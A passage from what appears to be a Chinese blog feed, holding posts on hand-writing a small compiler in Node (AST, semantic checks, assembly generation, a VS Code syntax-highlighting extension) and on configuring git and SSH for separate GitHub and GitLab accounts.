class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Program</span>_Class &#123;<br>  <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>    <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>    <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Branch</span>_Class &#123;<br>      <span class="hljs-attr">ifCond</span>: <span class="hljs-title class_">Cond</span>_Class &#123;<br>        <span class="hljs-attr">lExpr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>        <span class="hljs-attr">rExpr</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;0&#x27;</span> &#125;,<br>        <span class="hljs-attr">op</span>: <span class="hljs-string">&#x27;==&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">statementTrue</span>: <span class="hljs-title class_">Return</span>_Class &#123; <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125; &#125;,<br>      <span class="hljs-attr">statementFalse</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;m&#x27;</span>,<br>        <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>          <span class="hljs-attr">params_list</span>: [ <span class="hljs-literal">undefined</span> ],<br>          <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>          <span class="hljs-attr">params</span>: <span class="hljs-title class_">Sub</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;1&#x27;</span> &#125;<br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>        &#125;,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>          <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;m&#x27;</span> &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;,<br>    <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>      <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span> ],<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;sum&#x27;</span>,<br>      <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>        <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>          <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>          <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;y&#x27;</span> &#125;<br>        &#125;<br>      &#125;,<br>      <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;y&#x27;</span>,<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;<br>      &#125;,<br>      <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>        <span class="hljs-attr">formal_list</span>: [],<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;main&#x27;</span>,<br>        <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>,<br>          <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>          <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;10&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;10&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;print&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;<br>        &#125;,<br>        <span class="hljs-attr">formals</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="六语义分析">六、语义分析</h2><p>在语义分析阶段可以做类型检查和基本的校验，这里放置了一些基本的类型检查动作：1. 必须要有main函数，main函数的返回值必须是整形 2.其他函数的返回值和实际返回值类型对应 3. 赋值语句左右两侧类型一致 4.同一个作用域不得出现同名变量 5. 变量必须先声明并初始化才能使用</p><h2 id="七汇编代码生成">七、汇编代码生成</h2><p>思路：遍历ast自上向下进行利用堆栈机代码生成，由于本语言比较简单，仅使用了3个寄存器，a0，v0，t0，其中v0是辅助寄存器帮助函数返回值存储以及系统调用的退出和打印；</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cgenForSub(e1, e2) &#123;<br>cgen(e1)<br>sw <span class="hljs-variable">$a0</span>, 0(<span class="hljs-variable">$29</span>)<br>addiu <span class="hljs-variable">$29</span>, <span class="hljs-variable">$29</span>, -4<br>cgen(e2)<br><span class="hljs-built_in">add</span> <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里最重要的点是对声明变量的内存分配以及取变量的时候，要知道对应的作用域链，该从哪个作用域获取变量，只要我们对基本的一些单元表达式做好了代码生成的工作，后面就是搭积木的工作了；下面是该语言的函数栈示意图：<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/%E9%A3%9E%E4%B9%A620230502-104729.jpg" class="" title="这是一张图片"></p><p>这里如何取参数？由于函数栈在扩增的时候，不太方便通过sp指针获取参数和变量的存储位置，所以这里使用fp指针去作为基地址，寻找参数和局部变量</p><p>关于作用域问题是采用的树结构存储(双向链表)，每次从当前所在作用域内寻找变量，再继续依次向上寻找，直到找到函数级作用域；</p><h2 id="八编写代码高亮语法插件">八、编写代码高亮语法插件：</h2><p>我这里是速成版，比较简单，只涉及简单的语法部分 需要安装：<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>如果是需要编写全新的插件，则允许： yo code 选择 new LanguageSupport，提示一些问题，按需填写即可，插件名称尽可能唯一，不然在插件市场里不好搜，运行完命令之后会有一个生成目录，编写高亮语法的文件在xxx.tmLanguage.json 文件里，如果你只是配置一个 VS Code中已有语言的语法，记得删掉生成的 package.json 中的 languages 配置。</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(编写插件vscode)</p><p>这里看下我的规则：</p><p>以及vscode里的settings.json文件： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 这里是自己所选择的主题颜色，我的是vscode默认的颜色</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 自定义或者符合标准规范的命名，对应插件里的xxx.tmLanguage.json文件里的name选项</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.json里的配置： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// 类型</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// 关键字</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//注释</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>踩坑点：</p><ol type="1"><li><p>因为是根据分词 token那一套来的，其实也就是对你的语言的文件后缀名，比如我这里是 mc后缀，会做一个词法分析，词法分析的正则是自己编写的，然后每个正则也有对应的name，vscode 在配置(setting.json 文件)里可以根据这些 name做颜色的映射。所以一定要记得简单的正则要在两边加\b\b，表示单词分界，我一开始没加这个总是不生效</p></li><li><p>关于 name的命名，其实有一套规范的标准，当然也可以随心自定义，我这里的？？？就是自定义的。</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># 生成 myExtension.vsix,这时候本地可以看到一些二进制插件文件</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>如果以前没有 vscode 插件市场的账户需要注册https://code.visualstudio.com/api/working-with-extensions/publishing-extension注册完之后，记得本地保存下密钥，因为会经常用的</p><p>取消发布的插件： vsce unpublish -p 密钥 包 id 包 id 可以在 vscode的对应插件的信息里可以看到，(一般点击插件的设置图标就可以看到包 id选项)</p><p>TextMate 语法最好对正则比较熟悉 具体的详细资料：https://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventions（TextMate语法规则）https://macromates.com/manual/en/regular_expressions（相关正则）</p><h3 id="项目踩坑点">项目踩坑点</h3><ol type="1"><li>我本地全局和项目下都是安装了 ts-nodede1，但是通过 npm runts-node，就是起不起来：Cannot find module'typescript'，后来在https://github.com/TypeStrong/ts-node/issues/707，好像是版本的问题，找到了最好的解决方案：npm linktypescript，再运行即可</li></ol><h3 id="项目难点">项目难点</h3><p>其实整个项目是在学习斯坦福编译原理的时候有顺便一起写的，写下来也挺累的，因为已经在工作了，在编写本项目前，也看了下斯坦福的cool 源码，然后了解了下 bison 和flex，顺便对照了了下虎书的伪代码，下面总结下一些比较重要或者困难的点：</p><ol type="1"><li><p>正则表达式部分，这一部分纯粹自己手写，代码设计可能看着有点邋遢，主要思想是借鉴虎书上的，虎书只画了几个图，也没有给伪代码，主要是怎么设计nfa的节点相关数据结构存储，一个是是用简单的链表，后面发现可能存在出度为多个的节点，就换用邻接表存储了，每个节点的信息包含了所有入度边的信息；其次正则表达式分析这里用的也是stack 对正则表达式进行分析，栈内的元素可能是节点也可能是字符串，在每次pop的时候需要注意对当前出栈的节点进行遍历拿到头尾节点，方便节点之间的连接。然后是将各个nfa 联合成一个大 nfa 的过程，采用 dfa + bfa + 备忘录 + 回溯；最好是将nfa =&gt; dfa 的过程，这一部分参照伪代码的，应该没啥大问题；</p></li><li><p>ast 生成部分：这一步文法分析表生成是参照伪代码的，后面的 ast生成过程是纯手写，其实在实现的过程中，也发现整个过程和 bison 的 yy文件如出一辙，不知道 bison 是怎么实现的 😯，本来是想弄成简单的 bison文件编写文法规则的，但是时间不允许，后面再抽空看下。ast生成这一部分主要是在规约动作上放置一些用户定义动作，这里就是写死的生成对应文法表达式的类，自底向上构建ast</p></li><li><p>这比一部分理论其实挺多的，但是在本项目里只要考虑周到即可，防止在编译的最好阶段报错，也是纯手写的</p></li><li><p>汇编生成部分：这一部分个人觉得最恶心了，因为汇编比较难调试，每次有bug都需要汇编语句一句一句看，其实回过头看，这样把元表达式（像+-<em>/赋值语句）的寄存器分配设计写好了，就可以拿它们组合成更大的原件。这里也是纯手写的，有一个比较困扰我的点，像if-else里面声明的变量如何在运行时候分配内存？我们都知道局部变量在不考虑用寄存器优化的情况下，一般都是存储在栈内的，像参数都是基于fp(栈指针)进行寻址的，比如形式参数 x,y，在生成汇编的时候就要记录，这里我拿数组的[x, y]，这样 x 的偏移量就是fp + 1 </em> 4, y 就是 fp + 2 * 4，但是像 if else里面的声明的变量只有运行到对应的分支才能分配内存，也就是说另一个没有执行的分支是不需要分配内存的。</p></li></ol><h3 id="参考文章">参考文章</h3><p><ahref="https://blog.csdn.net/qq_42977003/article/details/112341427">LL1文法、LR(0)文法、SLR文法、LR(1)文法、LALR文法_不积硅步的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/77663680">栈和栈帧 - 知乎(zhihu.com)</a></p><p><ahref="https://www.cnblogs.com/henuliulei/p/10872483.html">LL(1),LR(0),SLR(1),LALR(1),LR(1)对比与分析- 你的雷哥 - 博客园 (cnblogs.com)</a></p><p><ahref="https://wangwangok.github.io/2020/05/05/bottom2top_syntax_parser_lalr/#:~:text=“规范LR”">语法分析——自底向上语法分析中的规范LR和LALR· 凌云壮志幾多愁 (wangwangok.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础, node</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git多账号管理</title>
    <link href="/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    <url>/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>为什么提交了代码并推送到github，但是github上的contributions并没有增加呢？</p><p>其中Github官方给出了一个官方文件，告诉我们什么样的Commit可以被记入Contribution，请点击此处查看。</p><p>在官方的帮助文档中，有一条是Commit被记入Contribution中必须满足用于Commit的邮件地址必须与Github账户相关联。其实，这也是为什么我的Commit没有被记入Contribution和不显示头像的原因，也是大多数人也是这个原因</p><p>https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-settings-on-your-profile/why-are-my-contributions-not-showing-up-on-my-profile</p><p>我遇到的问题的解决方案是：该仓库的本地的邮箱和github账户的邮箱不是同一个配置：可以修改本地仓库的邮箱和github上一致：git config --local user.name 张三 git config --local user.emailzhansan@996icu.com</p><p>如果拿到一台公司电脑, 那么就请按照下面的最佳实践配置下git的多环境:请先执行命令打开配置文件 vi ~/.ssh/config</p><p>然后输入以下内容： # gitlab Host gitlab User git HostNamegitlab.company.com PreferredAuthentications publickey IdentityFile~/.ssh/gitlab_rsa ServerAliveInterval 300 ServerAliveCountMax 10 #github Host github User git HostName github.com PreferredAuthenticationspublickey IdentityFile ~/.ssh/github_rsa ServerAliveInterval 300ServerAliveCountMax 10</p><p>这里唯一需要替换的gitlab里的HostName部分, 改成你们公司的git地址.</p><p>遇到GitHub报permission denied错就执行：ssh-add -k ~/.ssh/github_rsa遇到gitlab报permission denied错就执行：ssh-add -k ~/.ssh/gitlab_rsa</p><p>推荐阅读：https://zhuanlan.zhihu.com/p/62071906</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/05/05/minic/"/>
    <url>/emocoder/2023/05/05/minic/</url>
    
    <content type="html"><![CDATA[<h1 id="node-手写编译器-minicompiler">node 手写编译器-minicompiler</h1><p>使用语言：node, C++本文涉及：编译器的词法分析，抽象语义树生成，语法分析，代码生成本文重点内容：</p><ol type="1"><li>实现正则表达式分析器</li><li>实现简易版 Flex</li><li>实现 LR0 语法，并简单介绍其他语法(LL, LR1, SLR, LSPR)</li><li>实现简易版 Bison</li><li>实现生成汇编代码</li><li>实现简易编译器功能，提供编译时期类型检查和推断，支持加减乘除支持函数的递归调用，以及</li></ol><p>会包含的：</p><ol type="1"><li>实现 nfa，以及联合 nfa =&gt; dfa，进行词法分析</li><li>实现 dfa，进行语法分析，并基于此构建抽象语法树(AST)</li><li>基于 ast 进行语言义分析(类型检查以及是否符合语言规范)</li><li>基于 ast生成汇编代码，虽然本文没有显示的终中间代码生成过程，但是也有类似的思想</li></ol><p>不会包含的：本语言比较简单，不包含复杂数据结构的支持，如数组对象等其他功能；不会涉及复杂的编译器后端知识：如垃圾回收，寄存器染色，数据流分析等等</p><p>minic 语法：</p><ol type="1"><li>运算符：支持+-*/运算，不支持优先级(, )</li><li>类型：支持自然数(int 类型)，字符串，布尔值以及 void</li><li>语句：支持函数调用，嵌套的 if-else语句（if-else必须成对出现，如下的语法是不允许的）</li><li>和 C 一样，必须要有 main 函数</li><li>变量必须声明的时候同时赋值，如下的声明是不允许的</li><li>允许块级作用域</li><li>允许返回值是条件表达式，运算表达式</li><li>运算符左右两侧仅可以是变量或是数字</li></ol><h2 id="一minic-语法">一、minic 语法：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我会从以下四个方面依次入手：</p><ol><li>parser</li><pre><code 